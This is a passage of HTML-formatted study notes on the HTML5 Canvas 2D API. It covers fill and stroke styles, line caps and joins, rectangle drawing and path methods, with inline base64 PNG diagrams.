Z0NwExCcrReCsyG4CQjO1gvB2RDcBARn64XgbAhuAoKz9UJwNgQ3AcHZeiE4G4KbgOBsvRCcDcFNQHC2XgjOhuAmYF4eLeYRXEKCy4N5MQSXkODyYF4MwSUkuDyYF0NwCQkuD+bFEFxCgsuDeTEEl5Dg8mBezOaC+/37dzEJLg/mxSg4a60tLcEVgHl5tJhHcAkJLg/mxRBcQgWnG7GULV/TxCPz8vTMI7iE7HB5MC+G4BISXB7MiyG4hASXB/NiCC4hweXBvBiCS0hweTAvhuASElwezIshuIQElwfzYgguIcHlwbwYgktIcHkwL4bgEhJcHsyLIbiEBJcH82IILiHB5cG8GIJLSHB5MC+G4BISXB7MiyG4hASXB/NiCC4hweXBvBiCS0hweTAvZnPB/fnzp5gElwfzYhSctdaWluAKwLw8WswjuIQKTjdiKXmNjzy3MI/gErLD5cG8GIJLSHB5MC+G4BISXB7MiyG4hASXB/NiCC4hweXBvBiCS0hweTAvhuASElwezIshuIQElwfzYgguoYLTDYRYUmutLe1qgrMuR1ybBIdYUYJDrCjBbdy7u7u91vvk1dWVeTkuY/fBKbag9X78f1TW5VJBpaLidq0rwa1c/SmKbhu9td4/Du7m5mb3+Pj49zy3a127D06yKI53HNz5+fm7HZHbtq4E16mK4vLy8u/58S51fX3997wiCqel3qfLLi4u9jPCx4bd8Ozs7O91dV7v1/WHnwOXcRXBnaqKQXf/np+f96dvb2/3lyuYqV1KMSoefYw+Vtc9tMPpvK6v6w7vbmJ5Ca5jFYp2Ke1YikGxhKCG1xsGNw5KMw4FN/U+LC/BdWzY2RSb7g7qrRxHMYxGgSrKcH54l1ISXFu7DW54jCJ1VyfcpTolFYtCGJ8eOoxGwShK3VYKT+8juH7sOrjxQpl66HvLapcL/9Do9HD3Cg5vJ6l/nHSZrquAhhHpsuFx2vBjx+/D8i4WXAkUmRaZFozuGgGsna6DU2g6JtFdJIUHsHa6Dk6EBwEAtkD3wekYQzsdwBYgOICKEBxARboPDmBLEBxARQgOoCIEB1ARggOoyCLBPTw87N7e3v49BwBCTagNL+7g9Auw/CoWwHvUhNrw4g7u6emp+OvFA6wdNaE2vLiDe3193Zc8ZzjAllELakJteHEHJ15eXvafQFVrK+WYDk4NrXmtfTWgFtTEHGYFJ1RzKFsHi3qEBvFU1JoP9/Tm7GyB2cEBwPEQHEBFCA6gIgQHUBGCA6gIwQFUhOAAKkJwABUhOICKEBxANXa7fwBAjB7XZUZO5gAAAABJRU5ErkJggg==" alt=""></p></li> <li><p>Fills and Strokes</p> <ul><li>Fill automatically fills in the shape with a specific style (color, gradient, or image) while stroke colors only the edges</li> <li>All drawing operations involving stroke and fill will use these styles until the properties are changed again</li> <li>values of a style
<ul><li>color, <code>CanvasGradient</code>, <code>CanvasPattern</code></li></ul></li> <li><code>CanvasRenderingContext2D.fillStyle</code></li> <li><code>CanvasRenderingContext2D.strokeStyle</code> <ul><li>uses line style</li></ul></li> <li>values
<ul><li>defaults to <code>#000</code></li> <li><code>color</code> — A <code>DOMString</code> parsed as CSS <code>&lt;color&gt;</code> value</li> <li><code>gradient</code> — A <code>CanvasGradient</code> object (a linear or radial gradient)</li> <li><code>pattern</code> — A <code>CanvasPattern</code> object (a repetitive image)</li></ul></li> <li>Line styles
<ul><li><code>CanvasRenderingContext2D.lineWidth</code> — Width of lines. Default 1.0
<ul><li>zero, negative, <code>Infinity</code> and <code>NaN</code> values are ignored</li></ul></li> <li><code>CanvasRenderingContext2D.lineCap</code> — Type of endings on the end of lines. Possible values: <code>butt</code> (default), <code>round</code>, <code>square</code><br> <img src="data:image/png;base64,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" alt=""></li> <li><code>CanvasRenderingContext2D.lineJoin</code> — Defines the type of corners where two lines meet. Possible values: round, bevel, miter (default)<br> <img src="data:image/png;base64,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" alt=""></li> <li><code>CanvasRenderingContext2D.miterLimit</code> — Miter limit ratio. Default 10
<ul><li>zero, negative, <code>Infinity</code> and <code>NaN</code> values are ignored</li> <li>how far the outside connection point can be placed from the inside connection point</li> <li>If two lines exceed this value, a bevel join gets drawn instead</li></ul></li> <li><code>CanvasRenderingContext2D.setLineDash(segments: number[]): void</code> — Sets the current line dash pattern
<ul><li>segments: length of line and gap</li> <li>If the number of elements in the array is odd, the elements of the array get copied and concatenated: <code>[5, 15, 25]</code> will become <code>[5, 15, 25, 5, 15, 25]</code></li></ul></li> <li><code>CanvasRenderingContext2D.getLineDash(): number[]</code> — Returns the current line dash pattern array containing an even number of non-negative numbers</li> <li><code>CanvasRenderingContext2D.lineDashOffset</code> — Specifies where to start a dash array on a line
<ul><li>defaults to 0.0</li></ul></li></ul></li></ul></li> <li><p>Drawing rectangles: only primitive shape</p> <ul><li>arguments: <code>(x: number, y: number, w: number, h: number): void</code> <ul><li>(x, y) staring point coordination</li> <li>w: width, h: hight</li></ul></li> <li><code>CanvasRenderingContext2D.clearRect()</code> — Sets all pixels in the rectangle defined by starting point (x, y) and size (width, height) to transparent black, erasing any previously drawn content</li> <li><code>CanvasRenderingContext2D.fillRect()</code> — Draws a filled rectangle at (x, y) position whose size is determined by width and height</li> <li><code>CanvasRenderingContext2D.strokeRect()</code> — Paints a rectangle which has a starting point at (x, y) and has a w width and an h height onto the canvas, using the current stroke style</li></ul></li> <li><p>Trailing effect — change <code>clearRect()</code> into</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">'rgba(255, 255, 255, 0.3)'</span><span class="token punctuation">;</span>
ctx<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>width<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ol> <h4 id="path-drawing"><a href="#path-drawing" class="header-anchor">#</a> Path Drawing</h4> <ol><li><p>Paths</p> <ul><li>individual path: <code>Path2D</code> <ul><li>no IE support</li> <li>constructor: <code>Path2D(d?: string | Path2D)</code> <ul><li>When invoked with another <code>Path2D</code> object, a copy is created</li> <li>When invoked with a string consisting of SVG path data, a new path is created from that description</li></ul></li> <li>methods
<ul><li>methods below</li> <li>no <code>beginPath()</code> method, but <code>Path2D.addPath(path: Path2D, transform?: SVGMatrix): void</code></li></ul></li></ul></li> <li><code>CanvasRenderingContext2D.beginPath(): void</code> — Starts a new path by emptying the list of sub-paths. Call this method when you want to create a new path</li> <li><code>CanvasRenderingContext2D.moveTo(x: number, y: number): void</code> — Moves the starting point of a new sub-path to the (x, y) coordinates</li> <li><code>CanvasRenderingContext2D.lineTo(x: number, y: number): void</code> — Connects the last point in the sub-path to the x, y coordinates with a straight line</li> <li><code>CanvasRenderingContext2D.closePath(): void</code> — Causes the point of the pen to move back to the start of the current sub-path. It tries to draw a straight line from the current point to the start. If the shape has already been closed or has only one point, this function does nothing</li> <li><code>CanvasRenderingContext2D.bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y): void</code> — Adds a cubic Bézier curve to the path
<ul><li>The first two points are control points and the third one is the end point</li> <li>The starting point is the last point in the current path</li> <li>degenerate to quadratic when no start point</li></ul></li> <li><code>CanvasRenderingContext2D.quadraticCurveTo(cpx, cpy, x, y)</code> — Adds a quadratic Bézier curve to the current path</li> <li><code>CanvasRenderingContext2D.arc(x, y, radius, startAngle, endAngle, anticlockwise?: boolean): void</code> <ul><li>Adds an arc to the path which is centered at (x, y) position with radius r starting at startAngle and ending at endAngle going in the given direction (defaulting to clockwise)</li> <li>angles in radian</li></ul></li> <li><code>CanvasRenderingContext2D.arcTo()</code> — Adds an arc to the path with the given control points and radius, connected to the previous point by a straight line<br> <img src="data:image/png;base64,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" alt=""> <ul><li>never elliptical. Typical use could be making a rounded corner</li> <li>The arc is tangential</li></ul></li> <li><code>CanvasRenderingContext2D.ellipse(x, y, radiusX, radiusY, rotation, startAngle, endAngle, anticlockwise?: boolean): void</code> — Adds an ellipse to the path which is centered at (x, y) position with the radii radiusX and radiusY starting at startAngle and ending at endAngle going in the given direction
<ul><li>no IE support</li> <li>angles in radian</li></ul></li> <li><code>CanvasRenderingContext2D.rect(x, y, w, h): void</code> — creates a path for a rectangle at position (x, y) with a size that is determined by width and height
